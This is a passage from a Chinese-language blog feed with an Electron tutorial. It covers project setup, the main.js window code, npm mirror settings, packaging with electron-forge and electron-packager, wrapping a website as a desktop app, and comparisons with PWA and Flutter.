class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm start</span><br></pre></td></tr></table></figure><p>5.空白是因为并没有任何内容，写个 HTML </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- index.html --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Welcome to your Electron application.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>6.修改主入口<code>main.js</code>代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在文件头部引入 Node.js 中的 path 模块</span></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// app：控制应用程序事件生命周期的模块</span></span><br><span class="line"><span class="comment">// BrowserWindow：创建和管理应用程序窗口模块</span></span><br><span class="line"><span class="keyword">const</span> &#123; app, BrowserWindow &#125; = <span class="built_in">require</span>(<span class="string">'electron'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createWindow</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> mainWindow = <span class="keyword">new</span> BrowserWindow(&#123;</span><br><span class="line">    width: <span class="number">800</span>,</span><br><span class="line">    height: <span class="number">600</span>,</span><br><span class="line">    webPreferences: &#123;</span><br><span class="line">      preload: path.join(__dirname, <span class="string">'preload.js'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  mainWindow.loadFile(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 打开开发工具</span></span><br><span class="line">  mainWindow.webContents.openDevTools()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在 Electron 中，只有在 app 模块的 ready 事件被激发后才能创建浏览器窗口</span></span><br><span class="line"><span class="comment">// 类似vue 的生命周期 将会在 Electron 结束后初始化</span></span><br><span class="line">app.whenReady().then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  createWindow()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Mac 逻辑 关闭只是隐藏 command + Q 才完全退出</span></span><br><span class="line">  app.on(<span class="string">'activate'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (BrowserWindow.getAllWindows().length === <span class="number">0</span>) createWindow()</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Windows 和 linux 关闭窗口会完全退出窗口</span></span><br><span class="line">app.on(<span class="string">'window-all-closed'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (process.platform !== <span class="string">'darwin'</span>) app.quit()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d933b096268f459ba1662c5753aa3b38~tplv-k3u1fbpfcp-zoom-1.image" alt=""></p><h3 id="脚手架"><a href="#脚手架" class="headerlink" title="脚手架"></a>脚手架</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 克隆示例项目的仓库</span></span><br><span class="line">git clone https://github.com/electron/electron-quick-start</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入这个仓库</span></span><br><span class="line">cd electron-quick-start</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装依赖并运行</span></span><br><span class="line">npm install &amp;&amp; npm start</span><br></pre></td></tr></table></figure><p>如果安装过慢可以设置淘宝源</p><p>最新淘宝源地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Npm 设置淘宝源</span></span><br><span class="line">npm config set registry https://registry.npmmirror.com/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 检查是否修改成功</span></span><br><span class="line"></span><br><span class="line">npm config get registry</span><br></pre></td></tr></table></figure><p>使用淘宝源运行时如果提示这个错误</p><blockquote><p>地址问题</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">throw new Error('Electron failed to install correctly, please delete node_modules/electron and try installing again')</span><br></pre></td></tr></table></figure><p>则设置electron 镜像源地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set electron_mirror https://cdn.npm.taobao.org/dist/electron/</span><br></pre></td></tr></table></figure><h3 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h3><blockquote><p>注意：<strong>图标格式</strong> Windows 下使用的 <code>icon.ico</code> Mac 使用的是 <code>icon.icns</code></p></blockquote><p><strong>使用electron-forge</strong> </p><p>安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev @electron-forge/cli</span><br><span class="line">npx electron-forge import</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run make</span><br></pre></td></tr></table></figure><p>打包参数配置 <code>package.json</code>文件里的<code>config =&gt; forge =&gt; packagerConfig</code></p><p><strong>使用electron-packager</strong></p><p>安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev electron-packager</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx electron-packager &lt;sourcedir&gt; &lt;appname&gt; --platform=&lt;platform&gt; --arch=&lt;arch&gt; [optional flags...]</span><br></pre></td></tr></table></figure><p>具体参数：<a href="https://github.com/electron/electron-packager" target="_blank" rel="noopener">https://github.com/electron/electron-packager</a></p><h2 id="将网站直接生成桌面应用"><a href="#将网站直接生成桌面应用" class="headerlink" title="将网站直接生成桌面应用"></a>将网站直接生成桌面应用</h2><p>用上面手动或者脚手架的方式创建初始化文件</p><p>修改 <code>main.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; app, BrowserWindow, Menu &#125; = <span class="built_in">require</span>(<span class="string">'electron'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createWindow</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> win = <span class="keyword">new</span> BrowserWindow(&#123;</span><br><span class="line">    autoHideMenuBar: <span class="literal">true</span>,</span><br><span class="line">    show: <span class="literal">false</span>, <span class="comment">// 是否显示窗口,否后,通过对象.show()打开</span></span><br><span class="line">    fullscreen: <span class="literal">false</span>,</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 优化加载方式 当页面在窗口中直接加载时，用户会看到未完成的页面，</span></span><br><span class="line"><span class="comment">   * 这不是一个好的原生应用的体验,使用此事件后显示窗口将没有视觉闪烁</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  win.on(<span class="string">'ready-to-show'</span>, () =&gt; &#123;</span><br><span class="line">    win.show()</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="comment">//生成调试工具栏</span></span><br><span class="line">  <span class="comment">// win.webContents.openDevTools()</span></span><br><span class="line">  <span class="comment">// 窗口最大化</span></span><br><span class="line">  win.maximize()</span><br><span class="line">  <span class="comment">// 加载远程URL(网址)</span></span><br><span class="line">  win.loadURL(<span class="string">'https://www.iyouhun.com/'</span>)</span><br><span class="line">  <span class="comment">// 设置菜单栏</span></span><br><span class="line">  <span class="keyword">const</span> template = [</span><br><span class="line">    &#123;</span><br><span class="line">      label: <span class="string">'文件'</span>,</span><br><span class="line">      submenu: [</span><br><span class="line">        &#123;</span><br><span class="line">          label: <span class="string">'关于'</span>,</span><br><span class="line">          role: <span class="string">'about'</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          label: <span class="string">'关闭'</span>,</span><br><span class="line">          accelerator: <span class="string">'Command+Q'</span>,</span><br><span class="line">          click: <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            win.close()</span><br><span class="line">          &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">      ],</span><br><span class="line">    &#125;,</span><br><span class="line">  ]</span><br><span class="line">  <span class="keyword">const</span> menu = Menu.buildFromTemplate(template)</span><br><span class="line">  Menu.setApplicationMenu(menu)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.on(<span class="string">'ready'</span>, createWindow)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Windows 和 linux 关闭窗口会完全退出窗口</span></span><br><span class="line">app.on(<span class="string">'window-all-closed'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (process.platform !== <span class="string">'darwin'</span>) &#123;</span><br><span class="line">    app.quit()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.on(<span class="string">'activate'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="comment">// Mac 逻辑</span></span><br><span class="line">  <span class="keyword">if</span> (BrowserWindow.getAllWindows().length === <span class="number">0</span>) &#123;</span><br><span class="line">    createWindow()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="Electron的优缺点"><a href="#Electron的优缺点" class="headerlink" title="Electron的优缺点"></a>Electron的优缺点</h2><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul><li>原生的接口（菜单、消息提醒、系统托盘等）。</li><li>上手难度低，能够使用react、vue等前端框架，能方便地迁移前端组件，构建出漂亮的桌面应用。</li><li>方便热更新</li><li>调试和测试方便</li><li>Electron使用node.js。因此，您可以导入Chrome应用程序中不容易使用的许多模块</li><li>Electron文档要好得多</li></ul><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul><li>不适合开发轻量级的应用。即使一个electron的项目框架，也包含chromium内核。</li><li>相比c++开发的桌面应用，性能远远不如后者。</li><li>启动速度慢。</li><li>每个窗口都是一个新的进程，占据大量内存。</li></ul><h2 id="Electron和-PWA"><a href="#Electron和-PWA" class="headerlink" title="Electron和 PWA"></a>Electron和 PWA</h2><ul><li>可用性<ul><li>Electron 不能安装在任何设备</li><li>PWA 只要有网有浏览器记性，甚至不需要网络</li></ul></li><li>性能<ul><li>PWA具有更好性能，使用 Service Worker，减少加载时间</li></ul></li><li>占用空间<ul><li>Electron包过大，毕竟每个包都包含了包含chromium内核</li></ul></li><li>安全性<ul><li>Electron包不加任何混淆加密的话是完全可读的，因为存放在本地</li><li>PWA存放在服务端且只能通过HTTPS传输</li></ul></li><li>更新和集成<ul><li>两者都可以做到服务端异步更新</li></ul></li><li>交互<ul><li>Electron可以调用原生的接口</li></ul></li></ul><h2 id="Electron和Flutter"><a href="#Electron和Flutter" class="headerlink" title="Electron和Flutter"></a>Electron和Flutter</h2><ul><li>上手难度<ul><li>Electron：会基础的HTML、CSS、JS即可</li><li>Flutter：需学习Dart语言</li></ul></li><li>侧重点<ul><li>Electron更偏向PC端应用</li><li>Flutter更偏向移动端应用</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;使用 JavaScript，HTML 和 CSS 构建跨平台的桌面应用程序&lt;/p&gt;
&lt;/blockquote&gt;
&lt;
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="Flutter" scheme="//www.shen.ee/tags/Flutter/"/>
    
      <category term="Electron" scheme="//www.shen.ee/tags/Electron/"/>
    
      <category term="Electron入门" scheme="//www.shen.ee/tags/Electron%E5%85%A5%E9%97%A8/"/>
    
      <category term="Electron快速上手" scheme="//www.shen.ee/tags/Electron%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/"/>
    
      <category term="将网站直接生成桌面应用" scheme="//www.shen.ee/tags/%E5%B0%86%E7%BD%91%E7%AB%99%E7%9B%B4%E6%8E%A5%E7%94%9F%E6%88%90%E6%A1%8C%E9%9D%A2%E5%BA%94%E7%94%A8/"/>
    
      <category term="PWA" scheme="//www.shen.ee/tags/PWA/"/>
    
  </entry>
  
</feed>
